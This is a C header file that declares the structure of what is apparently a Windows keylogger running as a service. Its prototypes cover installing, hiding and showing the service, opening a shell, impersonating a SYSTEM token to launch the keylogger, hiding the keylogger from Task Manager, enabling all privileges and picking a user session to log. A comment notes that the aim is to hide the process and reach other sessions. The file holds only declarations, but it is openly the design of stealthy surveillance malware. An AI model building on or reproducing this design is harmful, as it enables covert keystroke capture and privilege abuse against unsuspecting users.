#pragma once
#pragma warning(disable: 4820)
#define WIN32_LEAN_AND_MEAN
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#ifdef DEBUG
    #define _CRTDBG_MAP_ALLOC
    #include <crtdbg.h>
#endif
#include <windows.h>
#include <stdlib.h>
#include <crtdbg.h>

#include <sddl.h>
#include <shlwapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <tlhelp32.h>
#include <winsock2.h>
#include <winternl.h>
#include <ws2tcpip.h>
#include <wtsapi32.h>

#include "consts.h"


#define REEF(x){ if (x){ free(x); x = NULL;}}

//in order to hide process and have an access to other session. This is not mandatory but cool.
typedef long (*_RtlCreateUserThread)(HANDLE,
    PSECURITY_DESCRIPTOR,
    BOOLEAN,ULONG,
    PULONG,PULONG,
    PVOID,PVOID,
    PHANDLE,CLIENT_ID* );
_RtlCreateUserThread RtlCreateUserThread;

VOID InstallSvc(SC_HANDLE SCManager);
VOID StartSvc(SC_HANDLE SCManager);
VOID StopSvc(SC_HANDLE SCManager);
VOID DeleteSvc(SC_HANDLE SCManager);
VOID UpdateSvc(SC_HANDLE SCManager);
VOID HideSvc(SC_HANDLE SCManager);
VOID ShowSvc(SC_HANDLE SCManager);
VOID Shell(void);

VOID ImpersonateSystemTokenAndLaunchKeylogger(LPPROCESS_INFORMATION keylogInfo, DWORD sessionID);
VOID PrintUserNameByProc(void);
VOID PrintUserNameByThread(void);
VOID PrintPrivileges(HANDLE hToken);
DWORD GetPIDByProcName(char *name);
BOOL EnableAllPrivilege(HANDLE currentToken);

HANDLE HideKeyloggerFromTaskmgr(DWORD procID);

VOID WINAPI SvcMain(DWORD ac, LPTSTR *av);
VOID SvcInit(DWORD ac, LPTSTR *av);
VOID WINAPI SvcCtrlHandler(DWORD ctrl);
VOID ReportSvcStatus(DWORD currentState, DWORD win32ExitCode, DWORD waitHint);

DWORD GetActiveSessionId(void);
DWORD ChooseSessionToLog(void);

VOID log(void *toLog);
int PrintError(void);